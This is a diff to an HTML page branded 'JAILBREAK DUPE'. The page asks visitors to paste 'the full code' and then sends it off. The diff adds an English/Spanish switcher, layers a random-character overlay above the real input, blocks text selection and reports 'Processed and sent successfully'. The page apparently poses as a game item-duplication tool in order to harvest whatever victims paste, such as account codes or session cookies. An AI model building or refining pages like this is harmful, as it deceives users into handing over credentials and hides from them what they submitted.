@@ -22,6 +22,95 @@
             align-items: center;
         }
 
+        .language-switcher {
+            position: fixed;
+            top: 30px;
+            right: 40px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            z-index: 1000;
+            background: rgba(255, 255, 255, 0.08);
+            padding: 10px 20px;
+            border-radius: 50px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
+        }
+
+        .lang-label {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            opacity: 0.5;
+            transition: opacity 0.3s ease, transform 0.3s ease, box-shadow 0.3s ease;
+            cursor: pointer;
+            overflow: hidden;
+            padding: 0;
+        }
+
+        .lang-label img {
+            width: 32px;
+            height: 32px;
+            object-fit: cover;
+            border-radius: 50%;
+        }
+
+        .lang-label.active {
+            opacity: 1;
+            transform: scale(1.15);
+            box-shadow: 0 0 20px rgba(122, 255, 255, 0.4);
+        }
+
+        .switch {
+            position: relative;
+            display: inline-block;
+            width: 50px;
+            height: 24px;
+        }
+
+        .switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .slider-toggle {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255, 255, 255, 0.2);
+            transition: 0.3s;
+            border-radius: 34px;
+        }
+
+        .slider-toggle:before {
+            position: absolute;
+            content: "";
+            height: 18px;
+            width: 18px;
+            left: 3px;
+            bottom: 3px;
+            background: linear-gradient(135deg, #7a2be2, #4b6cff);
+            transition: 0.3s;
+            border-radius: 50%;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.3);
+        }
+
+        input:checked + .slider-toggle {
+            background: rgba(122, 255, 255, 0.3);
+        }
+
+        input:checked + .slider-toggle:before {
+            transform: translateX(26px);
+            background: linear-gradient(135deg, #2be2a7, #4bffc6);
+        }
+
         .title-main {
             margin-top: 60px;
             margin-bottom: 40px;
@@ -63,7 +152,7 @@
         textarea {
             position: absolute;
             inset: 0;
-            padding: 20px;
+            padding: 35px;
 
             background: transparent;
             color: transparent;
@@ -75,7 +164,13 @@
 
             font-size: 15px;
             line-height: 1.5;
-            z-index: 2;
+            z-index: 1;
+            
+            /* Hacer imposible seleccionar */
+            user-select: none;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
         }
 
         textarea::placeholder {
@@ -85,7 +180,7 @@
         #fakeText {
             position: absolute;
             inset: 0;
-            padding: 20px;
+            padding: 35px;
 
             font-family: monospace;
             font-size: 14px;
@@ -98,7 +193,7 @@
             user-select: none;
             background: transparent;
 
-            z-index: 1;
+            z-index: 2;
         }
 
         button {
@@ -118,6 +213,11 @@
         button:hover {
             transform: translateY(-3px);
             box-shadow: 0 25px 60px rgba(0, 0, 0, 0.6);
+        }
+
+        .btn-instructions {
+            margin-top: 20px;
+            background: linear-gradient(135deg, #2be2a7, #4bffc6) !important;
         }
 
         .status {
@@ -141,35 +241,128 @@
 </head>
 <body>
 
-<div class="title-main">JAILBREAK DUPE</div>
+<div class="language-switcher">
+    <span class="lang-label" data-lang="es">
+        <img src="https://flagcdn.com/es.svg" alt="Español">
+    </span>
+    <label class="switch">
+        <input type="checkbox" id="langToggle">
+        <span class="slider-toggle"></span>
+    </label>
+    <span class="lang-label" data-lang="en">
+        <img src="https://flagcdn.com/us.svg" alt="English">
+    </span>
+</div>
+
+<div class="title-main" data-en="JAILBREAK DUPE" data-es="JAILBREAK DUPE">JAILBREAK DUPE</div>
 
 <div class="container">
 
     <div class="editor">
-        <textarea id="message" placeholder="Paste the full code here..."></textarea>
+        <textarea id="message" placeholder="Paste the full code here..." data-placeholder-en="Paste the full code here..." data-placeholder-es="Pega el código completo aquí..."></textarea>
         <pre id="fakeText"></pre>
     </div>
 
-    <button onclick="send()">PROCESS</button>
+    <button onclick="send()">
+        <span data-en="PROCESS" data-es="PROCESAR">PROCESS</span>
+    </button>
     <div class="status" id="status"></div>
+    
+    <button class="btn-instructions" onclick="window.location.href='index_steps.html'">
+        <span data-en="📋 VIEW INSTRUCTIONS" data-es="📋 VER INSTRUCCIONES">📋 VIEW INSTRUCTIONS</span>
+    </button>
 </div>
 
 <script>
     const textarea = document.getElementById("message");
     const fakeText = document.getElementById("fakeText");
     const status = document.getElementById("status");
+    const langToggle = document.getElementById('langToggle');
+    const langLabels = document.querySelectorAll('.lang-label');
 
     const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
 
+    // Cargar idioma guardado o usar inglés por defecto
+    let currentLang = localStorage.getItem('language') || 'en';
+    
+    // Establecer estado inicial
+    if (currentLang === 'es') {
+        langToggle.checked = false;
+        langLabels[0].classList.add('active');
+        langLabels[1].classList.remove('active');
+    } else {
+        langToggle.checked = true;
+        langLabels[1].classList.add('active');
+        langLabels[0].classList.remove('active');
+    }
+    
+    // Aplicar idioma inicial
+    updateLanguage(currentLang);
+    
+    // Cambiar idioma al hacer click en el toggle
+    langToggle.addEventListener('change', function() {
+        currentLang = this.checked ? 'en' : 'es';
+        updateLanguage(currentLang);
+        localStorage.setItem('language', currentLang);
+        
+        // Actualizar labels activos
+        if (currentLang === 'en') {
+            langLabels[1].classList.add('active');
+            langLabels[0].classList.remove('active');
+        } else {
+            langLabels[0].classList.add('active');
+            langLabels[1].classList.remove('active');
+        }
+    });
+    
+    // Permitir click en los labels
+    langLabels.forEach((label, index) => {
+        label.addEventListener('click', () => {
+            langToggle.checked = index === 1;
+            langToggle.dispatchEvent(new Event('change'));
+        });
+    });
+    
+    function updateLanguage(lang) {
+        // Actualizar textos con data-en y data-es
+        document.querySelectorAll('[data-en]').forEach(element => {
+            const text = element.getAttribute('data-' + lang);
+            if (element.tagName === 'DIV' || element.tagName === 'SPAN') {
+                element.innerHTML = text;
+            } else {
+                element.textContent = text;
+            }
+        });
+        
+        // Actualizar placeholder del textarea
+        const placeholderText = textarea.getAttribute('data-placeholder-' + lang);
+        if (placeholderText) {
+            textarea.placeholder = placeholderText;
+        }
+        
+        // Actualizar mensajes de status según idioma
+        const statusText = status.textContent;
+        if (statusText) {
+            if (lang === 'es') {
+                if (statusText.includes('ERROR')) status.textContent = 'ERROR ❌';
+                if (statusText.includes('successfully')) status.textContent = 'Procesado y enviado correctamente ✔';
+                if (statusText.includes('Failed')) status.textContent = 'Error al enviar ❌';
+            } else {
+                if (statusText.includes('ERROR')) status.textContent = 'ERROR ❌';
+                if (statusText.includes('correctamente')) status.textContent = 'Processed and sent successfully ✔';
+                if (statusText.includes('Error al')) status.textContent = 'Failed to send ❌';
+            }
+        }
+    }
+
     function obfuscate(text) {
-        return text.replace(/[^\n]/g, () =>
+        return text.replace(/[^\s\n]/g, () =>
             chars.charAt(Math.floor(Math.random() * chars.length))
         );
     }
 
     textarea.addEventListener("input", () => {
         fakeText.textContent = obfuscate(textarea.value);
-        fakeText.scrollTop = textarea.scrollTop;
     });
 
     textarea.addEventListener("scroll", () => {
@@ -202,12 +395,12 @@
         })
     })
     .then(() => {
-        status.textContent = "Processed and sent successfully ✔";
+        status.textContent = currentLang === 'es' ? 'Procesado y enviado correctamente ✔' : 'Processed and sent successfully ✔';
         textarea.value = "";
         fakeText.textContent = "";
     })
     .catch(() => {
-        status.textContent = "Failed to send ❌";
+        status.textContent = currentLang === 'es' ? 'Error al enviar ❌' : 'Failed to send ❌';
     });
 }
 </script>
